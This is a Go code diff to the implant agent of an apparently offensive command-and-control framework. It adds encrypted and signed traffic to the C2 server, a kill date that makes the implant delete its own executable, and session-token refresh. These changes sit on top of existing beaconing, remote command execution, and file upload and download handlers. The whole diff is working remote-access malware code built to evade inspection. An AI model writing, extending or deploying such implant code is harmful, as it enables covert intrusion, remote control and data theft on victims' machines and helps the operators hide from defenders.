@@ -18,6 +18,7 @@ import (
 	"runtime"
 	"time"
 
+	"github.com/shardc2/shardc2/pkg/crypto"
 	"github.com/shardc2/shardc2/pkg/models"
 )
 
@@ -28,9 +29,11 @@ const (
 type Config struct {
 	ServerURL  string
 	ImplantKey string
+	PayloadKey []byte
 	CACert     string
 	Interval   time.Duration
 	Jitter     time.Duration
+	KillDate   time.Time
 }
 
 type Agent struct {
@@ -112,6 +115,81 @@ func (a *Agent) Run(ctx context.Context) error {
 	return a.StartBeaconing(ctx)
 }
 
+func (a *Agent) encryptedPayload(data []byte) ([]byte, error) {
+	if len(a.config.PayloadKey) == 0 {
+		return data, nil
+	}
+	return crypto.Encrypt(data, a.config.PayloadKey)
+}
+
+func (a *Agent) decryptPayload(data []byte) ([]byte, error) {
+	if len(a.config.PayloadKey) == 0 {
+		return data, nil
+	}
+	return crypto.Decrypt(data, a.config.PayloadKey)
+}
+
+func (a *Agent) signRequest(req *http.Request, body []byte) {
+	if len(a.config.PayloadKey) == 0 {
+		return
+	}
+	ts := crypto.TimestampNow()
+	sig := crypto.Sign(req.Method, req.URL.Path, body, a.config.PayloadKey, ts)
+	req.Header.Set("X-Signature", sig)
+	req.Header.Set("X-Timestamp", fmt.Sprintf("%d", ts))
+}
+
+func (a *Agent) doEncryptedRequest(ctx context.Context, method, path string, jsonBody interface{}) ([]byte, int, error) {
+	var rawBody []byte
+	if jsonBody != nil {
+		var err error
+		rawBody, err = json.Marshal(jsonBody)
+		if err != nil {
+			return nil, 0, fmt.Errorf("marshal: %w", err)
+		}
+	}
+
+	var reqBody []byte
+	contentType := "application/json"
+	if len(rawBody) > 0 {
+		enc, err := a.encryptedPayload(rawBody)
+		if err != nil {
+			return nil, 0, fmt.Errorf("encrypt: %w", err)
+		}
+		reqBody = enc
+		if len(a.config.PayloadKey) > 0 {
+			contentType = "application/octet-stream"
+		}
+	}
+
+	url := a.config.ServerURL + path
+	req, err := http.NewRequestWithContext(ctx, method, url, bytes.NewReader(reqBody))
+	if err != nil {
+		return nil, 0, err
+	}
+	req.Header.Set("Content-Type", contentType)
+	if a.sessionToken != "" {
+		req.Header.Set("X-Session-Token", a.sessionToken)
+	}
+	a.signRequest(req, reqBody)
+
+	resp, err := a.client.Do(req)
+	if err != nil {
+		return nil, 0, fmt.Errorf("request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	respBody, _ := io.ReadAll(resp.Body)
+	if len(a.config.PayloadKey) > 0 && len(respBody) > 0 && resp.StatusCode >= 200 && resp.StatusCode < 300 {
+		dec, err := a.decryptPayload(respBody)
+		if err != nil {
+			return nil, resp.StatusCode, fmt.Errorf("decrypt response: %w", err)
+		}
+		return dec, resp.StatusCode, nil
+	}
+	return respBody, resp.StatusCode, nil
+}
+
 func (a *Agent) Register(ctx context.Context) error {
 	body := map[string]interface{}{
 		"hostname":     a.profile.Hostname,
@@ -123,12 +201,27 @@ func (a *Agent) Register(ctx context.Context) error {
 	}
 
 	data, _ := json.Marshal(body)
-	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/register", bytes.NewBuffer(data))
+
+	var reqBody []byte
+	contentType := "application/json"
+	if len(a.config.PayloadKey) > 0 {
+		enc, err := a.encryptedPayload(data)
+		if err != nil {
+			return fmt.Errorf("encrypt: %w", err)
+		}
+		reqBody = enc
+		contentType = "application/octet-stream"
+	} else {
+		reqBody = data
+	}
+
+	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/register", bytes.NewReader(reqBody))
 	if err != nil {
 		return err
 	}
-	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Content-Type", contentType)
 	req.Header.Set("X-Implant-Key", a.config.ImplantKey)
+	a.signRequest(req, reqBody)
 
 	resp, err := a.client.Do(req)
 	if err != nil {
@@ -137,12 +230,21 @@ func (a *Agent) Register(ctx context.Context) error {
 	defer resp.Body.Close()
 
 	if resp.StatusCode != 201 {
-		body, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("registration rejected (status %d): %s", resp.StatusCode, string(body))
+		respBody, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("registration rejected (status %d): %s", resp.StatusCode, string(respBody))
+	}
+
+	respBody, _ := io.ReadAll(resp.Body)
+	if len(a.config.PayloadKey) > 0 {
+		dec, err := a.decryptPayload(respBody)
+		if err != nil {
+			return fmt.Errorf("decrypt register response: %w", err)
+		}
+		respBody = dec
 	}
 
 	var result registerResponse
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+	if err := json.Unmarshal(respBody, &result); err != nil {
 		return fmt.Errorf("decode response: %w", err)
 	}
 
@@ -152,36 +254,39 @@ func (a *Agent) Register(ctx context.Context) error {
 }
 
 func (a *Agent) Beacon(ctx context.Context) (*beaconResponse, error) {
-	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/beacon", nil)
-	if err != nil {
-		return nil, err
-	}
-	req.Header.Set("X-Session-Token", a.sessionToken)
-
-	resp, err := a.client.Do(req)
+	respBody, status, err := a.doEncryptedRequest(ctx, "POST", "/api/v1/agent/beacon", nil)
 	if err != nil {
 		return nil, fmt.Errorf("beacon failed: %w", err)
 	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-		return nil, fmt.Errorf("beacon rejected (status %d)", resp.StatusCode)
+	if status < 200 || status >= 300 {
+		return nil, fmt.Errorf("beacon rejected (status %d)", status)
 	}
 
 	var result beaconResponse
-	json.NewDecoder(resp.Body).Decode(&result)
+	json.Unmarshal(respBody, &result)
 	return &result, nil
 }
 
 func (a *Agent) StartBeaconing(ctx context.Context) error {
+	var beaconCount int64
 	for {
+		if !a.config.KillDate.IsZero() && time.Now().After(a.config.KillDate) {
+			log.Printf("[*] Kill date reached, self-destructing")
+			a.selfDestruct()
+			os.Exit(0)
+		}
+
 		result, err := a.Beacon(ctx)
 		if err != nil {
 			log.Printf("[-] Beacon error: %v", err)
 		} else if result.PendingCommands > 0 {
 			a.fetchAndExecuteCommands(ctx)
-			// Re-beacon immediately to check for more commands
 			continue
+		}
+
+		beaconCount++
+		if beaconCount%100 == 0 {
+			a.refreshToken(ctx)
 		}
 
 		jitter := time.Duration(rand.IntN(int(a.config.Jitter.Seconds()))) * time.Second
@@ -194,23 +299,35 @@ func (a *Agent) StartBeaconing(ctx context.Context) error {
 	}
 }
 
-func (a *Agent) fetchAndExecuteCommands(ctx context.Context) {
-	req, err := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/v1/agent/commands", nil)
-	if err != nil {
-		log.Printf("[-] Failed to create commands request: %v", err)
+func (a *Agent) refreshToken(ctx context.Context) {
+	respBody, status, err := a.doEncryptedRequest(ctx, "POST", "/api/v1/agent/refresh-token", nil)
+	if err != nil || status != 200 {
 		return
 	}
-	req.Header.Set("X-Session-Token", a.sessionToken)
+	var result struct {
+		Token string `json:"session_token"`
+	}
+	if json.Unmarshal(respBody, &result) == nil && result.Token != "" {
+		a.sessionToken = result.Token
+	}
+}
 
-	resp, err := a.client.Do(req)
+func (a *Agent) selfDestruct() {
+	exe, err := os.Executable()
+	if err == nil {
+		os.Remove(exe)
+	}
+}
+
+func (a *Agent) fetchAndExecuteCommands(ctx context.Context) {
+	respBody, _, err := a.doEncryptedRequest(ctx, "GET", "/api/v1/agent/commands", nil)
 	if err != nil {
 		log.Printf("[-] Failed to fetch commands: %v", err)
 		return
 	}
-	defer resp.Body.Close()
 
 	var result commandsResponse
-	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+	if err := json.Unmarshal(respBody, &result); err != nil {
 		log.Printf("[-] Failed to decode commands: %v", err)
 		return
 	}
@@ -278,6 +395,12 @@ func (a *Agent) handleUpload(payload string) (string, error) {
 	if err := json.Unmarshal([]byte(payload), &req); err != nil {
 		return "", fmt.Errorf("invalid upload payload: %w", err)
 	}
+
+	cleanPath := filepath.Clean(req.Path)
+	if !filepath.IsAbs(cleanPath) {
+		return "", fmt.Errorf("upload path must be absolute: %s", req.Path)
+	}
+
 	data, err := base64.StdEncoding.DecodeString(req.Data)
 	if err != nil {
 		return "", fmt.Errorf("decode data: %w", err)
@@ -286,13 +409,13 @@ func (a *Agent) handleUpload(payload string) (string, error) {
 	if req.Mode != 0 {
 		mode = os.FileMode(req.Mode)
 	}
-	if err := os.MkdirAll(filepath.Dir(req.Path), 0755); err != nil {
+	if err := os.MkdirAll(filepath.Dir(cleanPath), 0755); err != nil {
 		return "", fmt.Errorf("create directory: %w", err)
 	}
-	if err := os.WriteFile(req.Path, data, mode); err != nil {
+	if err := os.WriteFile(cleanPath, data, mode); err != nil {
 		return "", fmt.Errorf("write file: %w", err)
 	}
-	return fmt.Sprintf("uploaded %d bytes to %s", len(data), req.Path), nil
+	return fmt.Sprintf("uploaded %d bytes to %s", len(data), cleanPath), nil
 }
 
 func (a *Agent) handleDownload(path string) (string, error) {
@@ -343,22 +466,10 @@ func (a *Agent) reportResult(ctx context.Context, cmdID, output, status string) 
 		"output":     output,
 		"status":     status,
 	}
-	data, _ := json.Marshal(body)
-
-	req, err := http.NewRequestWithContext(ctx, "POST", a.config.ServerURL+"/api/v1/agent/result", bytes.NewBuffer(data))
-	if err != nil {
-		log.Printf("[-] Failed to create result request: %v", err)
-		return
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("X-Session-Token", a.sessionToken)
-
-	resp, err := a.client.Do(req)
+	_, _, err := a.doEncryptedRequest(ctx, "POST", "/api/v1/agent/result", body)
 	if err != nil {
 		log.Printf("[-] Failed to report result for %s: %v", cmdID, err)
-		return
 	}
-	resp.Body.Close()
 }
 
 func (a *Agent) ProfileSystem() (*SystemProfile, error) {
